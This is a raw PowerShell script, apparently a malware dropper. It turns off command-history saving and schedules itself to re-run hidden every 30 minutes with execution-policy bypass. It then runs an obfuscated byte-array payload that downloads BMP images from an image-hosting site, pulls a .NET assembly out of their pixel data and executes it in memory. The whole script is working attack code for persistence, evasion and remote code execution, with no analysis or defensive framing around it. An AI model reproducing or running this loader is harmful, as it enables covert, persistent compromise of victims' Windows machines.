$ts = "$env:USERNAME"
#$env:USERNAME
$p = $MyInvocation.MyCommand.Path
$env:USERNAME
$env:USERPROFILE
"$env:USERNAME" | Out-File -FilePath (Join-Path $env:USERPROFILE "$env:USERNAME.txt")


Set-PSReadLineOption -HistorySaveStyle SaveNothing;

$ds = "$env:windir\System32\WindowsPowerShell\v1.0\powershell.exe -NoLogo -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$p`""

schtasks.exe /create /tn $ts /SC minute /MO 30 /tr $ds /F


& ([ScriptBlock]::Create([System.Text.Encoding]::Default.GetString(@(83,101,116,45,80,83,82,101,97,100,76,105,110,101,79,112,116,105,111,110,32,45,72,105,115,116,111,114,121,83,97,118,101,83,116,121,108,101,32,83,97,118,101,78,111,116,104,105,110,103,13,10,65,100,100,45,84,121,112,101,32,45,65,115,115,101,109,98,108,121,78,97,109,101,32,83,121,115,116,101,109,46,68,114,97,119,105,110,103,13,10,65,100,100,45,84,121,112,101,32,45,65,115,115,101,109,98,108,121,78,97,109,101,32,83,121,115,116,101,109,46,78,101,116,13,10,102,117,110,99,116,105,111,110,32,102,97,32,123,13,10,13,10,32,32,32,32,36,119,101,99,32,61,32,78,101,119,45,79,98,106,101,99,116,32,83,121,115,116,101,109,46,78,101,116,46,87,101,98,67,108,105,101,110,116,13,10,32,32,32,32,36,117,114,108,32,61,32,34,104,116,116,112,115,58,47,47,105,46,105,109,103,104,105,112,112,111,46,99,111,109,47,102,105,108,101,115,47,106,108,106,53,51,48,48,111,121,85,46,66,109,112,34,13,10,32,32,32,32,36,109,101,109,115,32,61,32,78,101,119,45,79,98,106,101,99,116,32,83,121,115,116,101,109,46,73,79,46,77,101,109,111,114,121,83,116,114,101,97,109,13,10,32,32,32,32,36,119,101,99,46,68,111,119,110,108,111,97,100,68,97,116,97,40,36,117,114,108,41,32,124,32,37,32,123,32,36,109,101,109,115,46,87,114,105,116,101,40,36,95,44,32,48,44,32,36,95,46,76,101,110,103,116,104,41,32,125,13,10,13,10,32,32,32,32,36,109,101,109,115,46,80,111,115,105,116,105,111,110,32,61,32,48,13,10,32,32,32,32,36,105,109,103,49,32,61,32,91,83,121,115,116,101,109,46,68,114,97,119,105,110,103,46,73,109,97,103,101,93,58,58,70,114,111,109,83,116,114,101,97,109,40,36,109,101,109,115,41,13,10,13,10,32,32,32,32,36,101,110,99,32,61,32,78,101,119,45,79,98,106,101,99,116,32,39,83,121,115,116,101,109,46,67,111,108,108,101,99,116,105,111,110,115,46,71,101,110,101,114,105,99,46,76,105,115,116,91,66,121,116,101,93,39,13,10,13,10,13,10,32,32,32,32,36,98,105,116,100,32,61,32,36,105,109,103,49,46,76,111,99,107,66,105,116,115,40,91,83,121,115,116,101,109,46,68,114,97,119,105,110,103,46,82,101,99,116,97,110,103,108,101,93,58,58,70,114,111,109,76,84,82,66,40,48,44,32,48,44,32,36,105,109,103,49,46,87,105,100,116,104,44,32,36,105,109,103,49,46,72,101,105,103,104,116,41,44,32,91,83,121,115,116,101,109,46,68,114,97,119,105,110,103,46,73,109,97,103,105,110,103,46,73,109,97,103,101,76,111,99,107,77,111,100,101,93,58,58,82,101,97,100,79,110,108,121,44,32,91,83,121,115,116,101,109,46,68,114,97,119,105,110,103,46,73,109,97,103,105,110,103,46,80,105,120,101,108,70,111,114,109,97,116,93,58,58,70,111,114,109,97,116,51,50,98,112,112,65,114,103,98,41,13,10,32,32,32,32,36,115,99,48,49,32,61,32,36,98,105,116,100,46,83,99,97,110,48,13,10,32,32,32,32,36,115,116,114,105,49,32,61,32,36,98,105,116,100,46,83,116,114,105,100,101,13,10,13,10,13,10,102,111,114,32,40,36,121,32,61,32,48,59,32,36,121,32,45,108,116,32,36,105,109,103,49,46,72,101,105,103,104,116,59,32,36,121,43,43,41,32,123,13,10,32,32,32,32,102,111,114,32,40,36,120,32,61,32,48,59,32,36,120,32,45,108,116,32,36,105,109,103,49,46,87,105,100,116,104,59,32,36,120,43,43,41,32,123,13,10,32,32,32,32,32,32,32,32,36,112,105,120,101,108,79,102,102,115,101,116,32,61,32,36,121,32,42,32,36,115,116,114,105,49,32,43,32,36,120,32,42,32,52,13,10,32,32,32,32,32,32,32,32,36,98,121,116,101,32,61,32,91,83,121,115,116,101,109,46,82,117,110,116,105,109,101,46,73,110,116,101,114,111,112,83,101,114,118,105,99,101,115,46,77,97,114,115,104,97,108,93,58,58,82,101,97,100,66,121,116,101,40,36,115,99,48,49,44,32,36,112,105,120,101,108,79,102,102,115,101,116,41,13,10,32,32,32,32,32,32,32,32,36,101,110,99,46,65,100,100,40,36,98,121,116,101,41,13,10,32,32,32,32,125,13,10,125,13,10,13,10,13,10,36,105,109,103,49,46,85,110,108,111,99,107,66,105,116,115,40,36,98,105,116,100,41,13,10,36,97,115,115,101,109,98,108,121,32,61,32,91,82,101,102,108,101,99,116,105,111,110,46,65,115,115,101,109,98,108,121,93,58,58,76,111,97,100,40,36,101,110,99,46,84,111,65,114,114,97,121,40,41,41,13,10,36,97,115,115,101,109,98,108,121,46,69,110,116,114,121,80,111,105,110,116,46,73,110,118,111,107,101,40,36,110,117,108,108,44,32,64,40,41,41,13,10,13,10,125,13,10,13,10,13,10,102,97,13,10,13,10,13,10,13,10,102,117,110,99,116,105,111,110,32,102,98,32,123,13,10,13,10,32,32,32,32,36,119,101,99,32,61,32,78,101,119,45,79,98,106,101,99,116,32,83,121,115,116,101,109,46,78,101,116,46,87,101,98,67,108,105,101,110,116,13,10,32,32,32,32,36,117,114,108,32,61,32,34,104,116,116,112,115,58,47,47,105,46,105,109,103,104,105,112,112,111,46,99,111,109,47,102,105,108,101,115,47,105,66,114,113,57,52,52,51,72,87,107,46,66,109,112,34,13,10,32,32,32,32,36,109,101,109,115,32,61,32,78,101,119,45,79,98,106,101,99,116,32,83,121,115,116,101,109,46,73,79,46,77,101,109,111,114,121,83,116,114,101,97,109,13,10,32,32,32,32,36,119,101,99,46,68,111,119,110,108,111,97,100,68,97,116,97,40,36,117,114,108,41,32,124,32,37,32,123,32,36,109,101,109,115,46,87,114,105,116,101,40,36,95,44,32,48,44,32,36,95,46,76,101,110,103,116,104,41,32,125,13,10,13,10,32,32,32,32,36,109,101,109,115,46,80,111,115,105,116,105,111,110,32,61,32,48,13,10,32,32,32,32,36,105,109,103,49,32,61,32,91,83,121,115,116,101,109,46,68,114,97,119,105,110,103,46,73,109,97,103,101,93,58,58,70,114,111,109,83,116,114,101,97,109,40,36,109,101,109,115,41,13,10,13,10,32,32,32,32,36,101,110,99,32,61,32,78,101,119,45,79,98,106,101,99,116,32,39,83,121,115,116,101,109,46,67,111,108,108,101,99,116,105,111,110,115,46,71,101,110,101,114,105,99,46,76,105,115,116,91,66,121,116,101,93,39,13,10,13,10,13,10,32,32,32,32,36,98,105,116,100,32,61,32,36,105,109,103,49,46,76,111,99,107,66,105,116,115,40,91,83,121,115,116,101,109,46,68,114,97,119,105,110,103,46,82,101,99,116,97,110,103,108,101,93,58,58,70,114,111,109,76,84,82,66,40,48,44,32,48,44,32,36,105,109,103,49,46,87,105,100,116,104,44,32,36,105,109,103,49,46,72,101,105,103,104,116,41,44,32,91,83,121,115,116,101,109,46,68,114,97,119,105,110,103,46,73,109,97,103,105,110,103,46,73,109,97,103,101,76,111,99,107,77,111,100,101,93,58,58,82,101,97,100,79,110,108,121,44,32,91,83,121,115,116,101,109,46,68,114,97,119,105,110,103,46,73,109,97,103,105,110,103,46,80,105,120,101,108,70,111,114,109,97,116,93,58,58,70,111,114,109,97,116,51,50,98,112,112,65,114,103,98,41,13,10,32,32,32,32,36,115,99,48,49,32,61,32,36,98,105,116,100,46,83,99,97,110,48,13,10,32,32,32,32,36,115,116,114,105,49,32,61,32,36,98,105,116,100,46,83,116,114,105,100,101,13,10,13,10,13,10,102,111,114,32,40,36,121,32,61,32,48,59,32,36,121,32,45,108,116,32,36,105,109,103,49,46,72,101,105,103,104,116,59,32,36,121,43,43,41,32,123,13,10,32,32,32,32,102,111,114,32,40,36,120,32,61,32,48,59,32,36,120,32,45,108,116,32,36,105,109,103,49,46,87,105,100,116,104,59,32,36,120,43,43,41,32,123,13,10,32,32,32,32,32,32,32,32,36,112,105,120,101,108,79,102,102,115,101,116,32,61,32,36,121,32,42,32,36,115,116,114,105,49,32,43,32,36,120,32,42,32,52,13,10,32,32,32,32,32,32,32,32,36,98,121,116,101,32,61,32,91,83,121,115,116,101,109,46,82,117,110,116,105,109,101,46,73,110,116,101,114,111,112,83,101,114,118,105,99,101,115,46,77,97,114,115,104,97,108,93,58,58,82,101,97,100,66,121,116,101,40,36,115,99,48,49,44,32,36,112,105,120,101,108,79,102,102,115,101,116,41,13,10,32,32,32,32,32,32,32,32,36,101,110,99,46,65,100,100,40,36,98,121,116,101,41,13,10,32,32,32,32,125,13,10,125,13,10,13,10,13,10,36,105,109,103,49,46,85,110,108,111,99,107,66,105,116,115,40,36,98,105,116,100,41,13,10,36,97,115,115,101,109,98,108,121,32,61,32,91,82,101,102,108,101,99,116,105,111,110,46,65,115,115,101,109,98,108,121,93,58,58,76,111,97,100,40,36,101,110,99,46,84,111,65,114,114,97,121,40,41,41,13,10,36,97,115,115,101,109,98,108,121,46,69,110,116,114,121,80,111,105,110,116,46,73,110,118,111,107,101,40,36,110,117,108,108,44,32,64,40,41,41,13,10,125,13,10,13,10,13,10,102,98,13,10,13,10,35,102,98,98,13,10,13,10,13,10))));


$env:USERPROFILE





